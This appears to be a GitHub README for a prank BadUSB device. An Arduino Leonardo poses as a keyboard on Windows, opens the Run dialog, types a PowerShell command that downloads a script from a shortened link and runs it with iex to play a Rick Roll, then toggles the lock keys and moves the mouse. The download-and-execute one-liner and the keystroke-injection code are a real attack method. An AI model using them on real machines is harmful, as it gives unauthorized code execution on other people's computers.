# BadUSB - RickRoll
## Description 
BadUsb - Leonardo - Arduino - Rick Roll

Simple Arduino script for testing the Leonardo USB (badUsb Beetle). 

If connected to a Windows PC, it will attempt to run the Powershell Rick Roll.

![LeeHolmes.com Rick Roll](docs/Data/Assets/leeholmes_com_Rick_Roll.gif)

It will also tumble the keyboard NUM/CAP/SCROLL locks and jump the cursor position. 

### Overview

1. Inserted BadUSB waits for **_initialdelay** of 10 seconds. 
2. Script calls **RUNCOMMAND()** (Windows Key + 'R') for opening the run command window. 
   ```c
   void RUNCOMMAND() 
		{ 
			Press("GUI");  
			Press("r");   
			delay(1000);   
			Keyboard.releaseAll(); 
		}
   ```
2. Script then attempts to call the [Invoke-PSHtml5.ps1](https://bit.ly/3n8DTGj) script. 
   ```powershell
   powershell.exe -Command ""iex (New-Object Net.WebClient).DownloadString('https://bit.ly/3n8DTGj')""
   ```
   You can just run this manually from run/cmd prompt for testing. 
   Original script is from [leeholmes.com](http://www.leeholmes.com/projects/ps_html5/Invoke-PSHtml5.ps1)
   
   Moved here to prevent executing a scrpit externally from this repo. 
   
    _In case it gets changed to do something more nefarious._
	
	The script has been also be changed to call the [MP3](https://bit.ly/34ZkfWL) from this repo.
  
3. Enters a DO WHILE for ~2mins, tubmbling the keyboard locks
   ```c
   Press("CAPSLOCK");delay(_delay); Keyboard.releaseAll();   Press("NUMLOCK"); delay(_delay);Keyboard.releaseAll();   Press("SCROLLLOCK"); delay(_delay); Keyboard.releaseAll();   
   ```
4. Jumps the cursor position
   ```c
   Mouse.move(random(5, 5000), random(5, 5000), 0); 
   ```


## BadUsb Beetle Bad USB Microcontroller ATMEGA32U4
<img src="docs/Data/Assets/Leonardo.png" alt="Leonardo BadUsb">

Cheap BadUSB (£3>£10) sold on eBay/Amazon etc. 

## Arduino
<img src="docs/Data/Assets/Arduino.png" alt="Leonardo BadUsb">


## Demo
![DemoGIF](docs/Data/Assets/bAduSb.gif)


## Notes
When first inserted, Windows will install the COM port for the board which can interfere with the running of the script. 

It is possible to disable the COM to effectively seal the unit to just be a HID. Likely preventing you from re-programming the board. 

The GitHub forum post for this is here: https://github.com/arduino/Arduino/issues/6387
